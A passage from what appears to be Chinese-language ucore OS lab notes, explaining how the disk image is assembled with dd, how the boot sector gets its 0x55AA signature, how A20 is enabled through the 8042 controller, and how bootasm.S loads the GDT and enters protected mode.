conv=notrunc</span><br><span class="line"></span><br><span class="line">1+0 records in</span><br><span class="line">1+0 records out</span><br><span class="line">512 bytes (512 B) copied, 8.997e-05 s, 5.7 MB/s</span><br><span class="line"></span><br><span class="line">dd if=bin/kernel of=bin/ucore.img seek=1 conv=notrunc</span><br><span class="line"></span><br><span class="line">146+1 records in</span><br><span class="line">146+1 records out</span><br><span class="line">74923 bytes (75 kB) copied, 0.000318176 s, 235 MB/s</span><br></pre></td></tr></table></figure>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UCOREIMG	:= <span class="variable">$(<span class="built_in">call</span> totarget,ucore.img)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(UCOREIMG)</span>: <span class="variable">$(kernel)</span> <span class="variable">$(bootblock)</span></span><br><span class="line">	<span class="variable">$(V)</span>dd if=/dev/zero of=<span class="variable">$@</span> count=10000</span><br><span class="line">	<span class="variable">$(V)</span>dd if=<span class="variable">$(bootblock)</span> of=<span class="variable">$@</span> conv=notrunc</span><br><span class="line">	<span class="variable">$(V)</span>dd if=<span class="variable">$(kernel)</span> of=<span class="variable">$@</span> seek=1 conv=notrunc</span><br></pre></td></tr></table></figure>
<ol>
<li>生成一个有 10000 个块的文件，每个块默认 512 字节，用 0 填充<br>dd if=/dev/zero of=bin/ucore.img count=10000</li>
<li>把 bootblock 中的内容写到第一个块<br>dd if=bin/bootblock of=bin/ucore.img conv=notrunc</li>
<li>从第二个块开始写 kernel 中的内容<br>dd if=bin/kernel of=bin/ucore.img seek=1 conv=notrunc</li>
</ol>
<blockquote>
<p>/dev/zero ： 在类 UNIX 操作系统中, /dev/zero 是一个特殊的文件，当你读它的时候，它会提供无限的空字符(NULL, ASCII NUL, 0x00)。其中的一个典型用法是用它提供的字符流来覆盖信息，另一个常见用法是产生一个特定大小的空白文件。BSD 就是通过 mmap 把/dev/zero 映射到虚地址空间实现共享内存的。可以使用 mmap 将/dev/zero 映射到一个虚拟的内存空间，这个操作的效果等同于使用一段匿名的内存（没有和任何文件相关）。</p>
</blockquote>
<blockquote>
<p>if=文件名：输入文件名，默认为标准输入。即指定源文件。<br>of=文件名：输出文件名，默认为标准输出。即指定目的文件。<br>count=blocks：仅拷贝 blocks 个块，块大小等于 ibs 指定的字节数。 notrunc：不截短输出文件</p>
</blockquote>
<h3 id="一个被系统认为是符合规范的硬盘主引导扇区的特征是什么"><a href="#一个被系统认为是符合规范的硬盘主引导扇区的特征是什么" class="headerlink" title="一个被系统认为是符合规范的硬盘主引导扇区的特征是什么"></a>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: &lt;input filename&gt; &lt;output filename&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取输入文件的状态</span></span><br><span class="line">    <span class="keyword">if</span> (stat(argv[<span class="number">1</span>], &amp;st) != <span class="number">0</span>) <span class="comment">//不存在报错</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error opening file &#x27;%s&#x27;: %s\n&quot;</span>, argv[<span class="number">1</span>], strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;%s&#x27; size: %lld bytes\n&quot;</span>, argv[<span class="number">1</span>], (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; <span class="number">510</span>) <span class="comment">//文件大于510个字节报错，虽然启动扇区能够装512个字节，但最后两个字节必须是0x55AA来标志该扇区为合法的启动扇区，所以最多装510个</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%lld &gt;&gt; 510!!\n&quot;</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    FILE *ifp = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);          <span class="comment">//argv[0]是程序全名，argv[1]是输入文件，即以读二进制文件的方法打开输入文件</span></span><br><span class="line">    <span class="keyword">int</span> size = fread(buf, <span class="number">1</span>, st.st_size, ifp); <span class="comment">//从ifp读st.st_size个对象，每个对象读一次到buf中</span></span><br><span class="line">    <span class="keyword">if</span> (size != st.st_size)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;read &#x27;%s&#x27; error, size is %d.\n&quot;</span>, argv[<span class="number">1</span>], size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ifp);</span><br><span class="line">    buf[<span class="number">510</span>] = <span class="number">0x55</span>; <span class="comment">//把最后两个字节写成0x55AA</span></span><br><span class="line">    buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</span><br><span class="line">    FILE *ofp = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">    size = fwrite(buf, <span class="number">1</span>, <span class="number">512</span>, ofp); <span class="comment">//写回到输出</span></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">512</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;write &#x27;%s&#x27; error, size is %d.\n&quot;</span>, argv[<span class="number">2</span>], size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ofp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;build 512 bytes boot sector: &#x27;%s&#x27; success!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>符合规范的硬盘主引导扇区 size=512bytes，并且第 511 个 byte 值为 0x55，第 512 个 byte 的值为 0xAA</p>
<h2 id="操作系统启动过程"><a href="#操作系统启动过程" class="headerlink" title="操作系统启动过程"></a>操作系统启动过程</h2><ol>
<li>x86 PC 刚开机时 CPU 处于实模式</li>
<li>开机时，CS=0xFFFF; IP=0x0000</li>
<li>寻址 0xFFFF0(ROM BIOS 映射区)</li>
<li>检查 RAM，键盘，显示器，软硬磁盘</li>
<li>将磁盘 0 磁道 0 扇区读入 0x7c00 处</li>
<li>设置 cs=0x07c0，ip=0x0000</li>
</ol>
<h2 id="分析-bootloader-进入保护模式的过程"><a href="#分析-bootloader-进入保护模式的过程" class="headerlink" title="分析 bootloader 进入保护模式的过程"></a>分析 bootloader 进入保护模式的过程</h2><h3 id="为何开启-A20，以及如何开启-A20"><a href="#为何开启-A20，以及如何开启-A20" class="headerlink" title="为何开启 A20，以及如何开启 A20"></a>为何开启 A20，以及如何开启 A20</h3><p>在 i8086 时代，CPU 的数据总线是 16bit，地址总线是 20bit，寄存器是 16bit，因此 CPU 只能访问 1MB 以内的空间。因为数据总线和寄存器只有 16bit，如果需要获取 20bit 的数据, 需要 segment(每个 segment 大小恒定为 64K)左移 4 位再加上 offset 组成一个 20bit 的地址。理论上，20bit 的地址可以访问 1MB 的内存空间(0x00000 - (2^20 - 1 = 0xFFFFF))。但在实模式下, 这 20bit 的地址理论上能访问从 0x00000 - (0xFFFF0 + 0xFFFF = 0x10FFEF)的内存空间。也就是说，理论上我们可以访问超过 1MB 的内存空间，但越过 0xFFFFF 后，地址又会回到 0x00000。上面这个特征在 i8086 中是没有任何问题的(因为它最多只能访问 1MB 的内存空间)，但到了 i80286/i80386 后，CPU 有了更宽的地址总线，数据总线和寄存器后，这就会出现一个问题： 在实模式下, 我们可以访问超过 1MB 的空间，但我们只希望访问 1MB 以内的内存空间。为了解决这个问题， CPU 中添加了一个可控制 A20 地址线的模块，通过这个模块，我们在实模式下将第 20bit 的地址线限制为 0，这样 CPU 就不能访问超过 1MB 的空间了。进入保护模式后，我们再通过这个模块解除对 A20 地址线的限制，这样我们就能访问超过 1MB 的内存空间了。</p>
<p>现在使用的 CPU 都是通过键盘控制器 8042 (端口 0x64 和 0x60 连着键盘控制器) 来控制 A20 地址线。默认情况下，A20 地址线是关闭的(限制只能访问 1M 内存)，因此在进入保护模式(需要访问超过 1MB 的内存空间)前，我们需要开启 A20 地址线(第 20bit 的地址线可为 0 或者 1)。开启代码在 bootasm.S 文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">seta20.1:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.1</span><br><span class="line"></span><br><span class="line">    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.2</span><br><span class="line"></span><br><span class="line">    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">    outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br></pre></td></tr></table></figure>
<p>cpu 可以直接读写以下三个地方的数据，读写三个地方的指令都是不同的，他们的空间也是分开的。</p>
<ol>
<li>端口</li>
<li>内存</li>
<li>寄存器</li>
</ol>
<p>对外设的控制都是通过读写对应外设的端口来完成的。对端口的读写汇编指令只有 in 和 out。</p>
<p>由于当时的 8042 键盘控制器上恰好有空闲的端口引脚（输出端口 P2，引脚 P21），于是便使用了该引脚来作为与门控制这个地址比特位。该信号即被称为 A20。如果它为零，则比特 20 及以上地址都被清除。从而实现了兼容性。</p>
<p>当 A20 地址线控制禁止时，程序就像运行在 8086 上，1MB 以上的地址是不可访问的，只能访问奇数 MB 的不连续的地址。为了使能所有地址位的寻址能力，必须向键盘控制器 8082 发送一个命令，键盘控制器 8042 会将 A20 线置于高电位，使全部 32 条地址线可用，实现访问 4GB 内存。</p>
<p>控制 A20 gate 的方法有 3 种：</p>
<ol>
<li>804x 键盘控制器法</li>
<li>Fast A20 法</li>
<li>BIOS 中断法</li>
</ol>
<p>ucore 实验中用了第一种 804x 键盘控制器法，这也是最古老且效率最慢的一种。由于在机器启动时，默认条件下，A20 地址线是禁止的，所以操作系统必须使用适当的方法来开启它。</p>
<p>等待 8042 Input buffer 为空；<br>发送 Write 8042 Output Port （P2）命令到 8042 Input buffer；<br>等待 8042 Input buffer 为空；<br>将 8042 Output Port（P2）得到字节的第 2 位置 1，然后写入 8042 Input buffer</p>
<h3 id="如何初始化-GDT-表"><a href="#如何初始化-GDT-表" class="headerlink" title="如何初始化 GDT 表"></a>如何初始化 GDT 表</h3><p>在保护模式下，x86 CPU 通过 GDT 表访问内存，我们根据 CPU 给的逻辑地址分离出段选择子。利用这个段选择子选择一个段描述符。将段描述符里的 Base Address 和段选择子的偏移量相加而得到线性地址。这个地址就是我们需要的地址。</p>
<p><img src="https://segmentfault.com/img/remote/1460000009386096?w=640&h=300" alt="GDT"></p>
<p>在实模式下，通过 segment + offset 的方式一个程序可以访问内存中的任意一个地址，但是开启了保护模式之后，段选择子和段描述符中都有了特权级的概念，程序不能随意访问高特权级的段内容。段表有固定的格式被放到内存中，CPU 使用全局描述符表寄存器 GDTR 保存段表起始地址。GDTR 长 48 位，其中高 32 位为基地址，低 16 位为段界限。这里只需要载入已经静态存储在引导区的 GDT 表和其描述符到 GDTR 寄存器。理论上 GDT 可以存在内存中任何位置，但这里我们是在实模式下初始化 GDT 的，因此 GDT 应该是存在最低的这 1MB 内存空间中。CPU 通过 lgdt 指令读入 GDT 的地址，之后我们就可以使用 GDT 了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">#注释：#include &lt;asm.h&gt;</span><br><span class="line">asm.h头文件中包含了一些宏定义，用于定义gdt，gdt是保护模式使用的全局段描述符表，其中存储着段描述符。</span><br><span class="line"># Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="line"># The BIOS loads this code from the first sector of the hard disk into</span><br><span class="line"># memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="line"># with %cs&#x3D;0 %ip&#x3D;7c00.</span><br><span class="line">此段注释说明了要完成的目的：启动保护模式，转入C函数。</span><br><span class="line">这里正好说了一下bootasm.S文件的作用。计算机加电后，由BIOS将bootasm.S生成的可执行代码从硬盘的第一个扇区复制到内存中的物理地址0x7c00处,并开始执行。</span><br><span class="line">此时系统处于实模式。可用内存不多于1M。</span><br><span class="line"></span><br><span class="line">.set PROT_MODE_CSEG,        0x8                     # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG,        0x10                    # kernel data segment selector</span><br><span class="line">这两个段选择子的作用其实是提供了gdt中代码段和数据段的索引</span><br><span class="line">.set CR0_PE_ON,             0x1                     # protected mode enable flag</span><br><span class="line">这个变量是开启A20地址线的标志，为1是开启保护模式</span><br><span class="line"></span><br><span class="line"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">这两行代码相当于定义了C语言中的main函数，start就相当于main，BIOS调用程序时，从这里开始执行</span><br><span class="line">.code16                                             # Assemble for 16-bit mode</span><br><span class="line">因为以下代码是在实模式下执行，所以要告诉编译器使用16位模式编译。</span><br><span class="line">    cli                                             # Disable interrupts</span><br><span class="line">    cld                                             # String operations increment</span><br><span class="line">关中断，设置字符串操作是递增方向。cld的作用是将direct flag标志位清零，这意味着自动增加源索引和目标索引的指令(如MOVS)将同时增加它们。</span><br><span class="line"></span><br><span class="line">    # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">ax寄存器就是eax寄存器的低十六位，使用xorw清零ax，效果相当于movw $0, %ax。 但是好像xorw性能好一些，google了一下没有得到好答案</span><br><span class="line">    movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line">将段选择子清零</span><br><span class="line">    # Enable A20:</span><br><span class="line">    #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">    #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">准备工作就绪，下面开始动真格的了，激活A20地址位。先翻译注释：由于需要兼容早期pc，物理地址的第20位绑定为0，所以高于1MB的地址又回到了0x00000.</span><br><span class="line">好了，激活A20后，就可以访问所有4G内存了，就可以使用保护模式了。</span><br><span class="line"></span><br><span class="line">怎么激活呢，由于历史原因A20地址位由键盘控制器芯片8042管理。所以要给8042发命令激活A20</span><br><span class="line">8042有两个IO端口：0x60和0x64， 激活流程位： 发送0xd1命令到0x64端口 --&gt; 发送0xdf到0x60，done！</span><br><span class="line"># seta20.1这些破东西叫标号。标号有唯一的名字加冒号组成。它可以出现在汇编程序的任何地方，并与紧跟其后的哪行代码具有相同的地址。概括的说 ，当程序中要跳转到另一位置时，需要有一个标识来指示新的位置，这就是标号，通过在目标地址的前面放上一个标号，可以在指令中使用标号来代替直接使用地址。</span><br><span class="line">seta20.1:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.1</span><br><span class="line">#发送命令之前，要等待键盘输入缓冲区为空，这通过8042的状态寄存器的第2bit来观察，而状态寄存器的值可以读0x64端口得到。</span><br><span class="line">#上面的指令的意思就是，如果状态寄存器的第2位为1，就跳到seta20.1符号处执行，知道第2位为0，代表缓冲区为空</span><br><span class="line"></span><br><span class="line">    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line">发送0xd1到0x64端口</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.2</span><br><span class="line"></span><br><span class="line">    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">    outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br><span class="line"></span><br><span class="line">到此，A20激活完成。</span><br><span class="line">    # Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line">    # and segment translation that makes virtual addresses</span><br><span class="line">    # identical to physical addresses, so that the</span><br><span class="line">    # effective memory map does not change during the switch.</span><br><span class="line">转入保护模式，这里需要指定一个临时的GDT，来翻译逻辑地址。这里使用的GDT通过gdtdesc段定义。它翻译得到的物理地址和虚拟地址相同，所以转换过程中内存映射不会改变</span><br><span class="line">    lgdt gdtdesc</span><br><span class="line">载入gdt</span><br><span class="line">    movl %cr0, %eax</span><br><span class="line">    orl $CR0_PE_ON, %eax</span><br><span class="line">    movl %eax, %cr0</span><br><span class="line">打开保护模式标志位，相当于按下了保护模式的开关。cr0寄存器的第0位就是这个开关，通过CR0_PE_ON或cr0寄存器，将第0位置1</span><br><span class="line"></span><br><span class="line">    # Jump to next instruction, but in 32-bit code segment.</span><br><span class="line">    # Switches processor into 32-bit mode.</span><br><span class="line">    ljmp $PROT_MODE_CSEG, $protcseg</span><br><span class="line">由于上面的代码已经打开了保护模式了，所以这里要使用逻辑地址，而不是之前实模式的地址了。</span><br><span class="line">这里用到了PROT_MODE_CSEG, 他的值是0x8。根据段选择子的格式定义，0x8就翻译成：</span><br><span class="line">　　　　　　　　INDEX　　　　  TI     CPL</span><br><span class="line">            0000 0000 1    0      00</span><br><span class="line">INDEX代表GDT中的索引，TI代表使用GDTR中的GDT， CPL代表处于特权级。</span><br><span class="line"></span><br><span class="line">PROT_MODE_CSEG选择子选择了GDT中的第1个段描述符。这里使用的gdt就是变量gdt。下面可以看到gdt的第1个段描述符的基地址是0x0000,所以经过映射后和转换前的内存映射的物理地址一样。</span><br><span class="line">.code32                                             # Assemble for 32-bit mode</span><br><span class="line">protcseg:</span><br><span class="line">    # Set up the protected-mode data segment registers</span><br><span class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line"></span><br><span class="line">重新初始化各个段寄存器。</span><br><span class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    movl $start, %esp</span><br><span class="line">    call bootmain</span><br><span class="line">栈顶设定在start处，也就是地址0x7c00处，call函数将返回地址入栈，将控制权交给bootmain</span><br><span class="line"></span><br><span class="line">    # If bootmain returns (it shouldn&#39;t), loop.</span><br><span class="line">spin:</span><br><span class="line">    jmp spin</span><br><span class="line"></span><br><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                          # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     # null seg</span><br><span class="line">    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class="line">    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class="line"></span><br><span class="line">gdtdesc:</span><br><span class="line">    .word 0x17                                      # sizeof(gdt) - 1</span><br><span class="line">    .long gdt                                       # address gdt</span><br></pre></td></tr></table></figure>
<p>CPU 使用全局描述符表寄存器 GDTR 保存段表起始地址。GDTR 长 48 位，其中高 32 位为基地址，低 16 位为段界限。<code>lgdt</code>指令将源操作数中的值加载到全局描述符表格寄存器 (GDTR) 中（plus : lgdt 是间接寻址的）。载入 gdt 表，就是通过<code>lgdt gdtdesc</code>指令设置 GDTR 寄存器中的内容。</p>
<p>0x17 换成 10 进制就是 23,总共就有 24 个字节。一个 GDT 表项有 64 个 bit 占 8byte。总共 3 个表项一共就有 24 个字节。基地址 32 位是 gdt 这个标号所代表数据段的地址。GDT 的第一项总是为 0, 这就确保空段选择符的逻辑地址会被认为是无效的, 因此引起一个处理器异常.</p>
<p>上面的地址一共分了两段，第一段可执行可写，第二段可读，地址空间都覆盖整个 32 位 4GB 的保护模式空间。也正如之前 uCore 介绍的没有特别采用段机制</p>
<h3 id="如何使能和进入保护模式"><a href="#如何使能和进入保护模式" class="headerlink" title="如何使能和进入保护模式"></a>如何使能和进入保护模式</h3><p>因为我们无法直接操作 CR0，所以我们首先要用一个通用寄存器来保存当前 CR0 寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movl %cr0, %eax</span><br><span class="line">orl $CR0_PE_ON, %eax  #CR0_PE_ON的值就是0x1</span><br><span class="line">movl %eax, %cr0       #保护模式打开</span><br><span class="line"></span><br><span class="line"># Jump to next instruction, but in 32-bit code segment.</span><br><span class="line"># Switches processor into 32-bit mode.</span><br><span class="line">ljmp $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure>
<p>由于一些现代 CPU 特性 （乱序执行和分支预测等），在转到保护模式之后 CPU 可能仍然在跑着实模式下的代码，这显然会造成一些问题。因此必须强迫 CPU 清空一次缓冲。对此，最有效的方法就是进行一次 long jump</p>
<blockquote>
<p>ljmp &lt;imm1&gt;, &lt;imm2&gt; # %cs ← imm1 # %ip ← imm2</p>
</blockquote>
<p>由于上面的代码已经打开了保护模式了，所以这里要使用逻辑地址，而不是之前实模式的地址了。<br>这里用到了 PROT_MODE_CSEG, 他的值是 0x8。根据段选择子的格式定义，0x8 就翻译成：<br>| INDEX | TI | CPL |<br>| —– | — | — |<br>| 0000 0000 1 | 0 | 00 |<br>INDEX 代表 GDT 中的索引，TI 代表使用 GDTR 中的 GDT， CPL 代表处于特权级。</p>
<p>PROT_MODE_CSEG 选择子选择了 GDT 中的第 1 个段描述符。这里使用的 gdt 就是变量 gdt。下面可以看到 gdt 的第 1 个段描述符的基地址是 0x0000,所以经过映射后和转换前的内存映射的物理地址一样。</p>
<p>进入保护模式后,需要重新设置所有段寄存器的内容，现在 这些寄存器里面都需要保存段选择子，因为刚才的段表只把内存空间分成 2 段但这两段地址空间完全重合，实际上只有一段。所以这个时候所有的代码、数据、堆栈段都是在一个段选择子里，所以值都是 0x8,完成设置之后跳转到函数 bootmain</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.code32                                             # Assemble for 32-bit mode</span><br><span class="line">protcseg:</span><br><span class="line">    # Set up the protected-mode data segment registers</span><br><span class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line"></span><br><span class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    movl $start, %esp</span><br><span class="line">    call 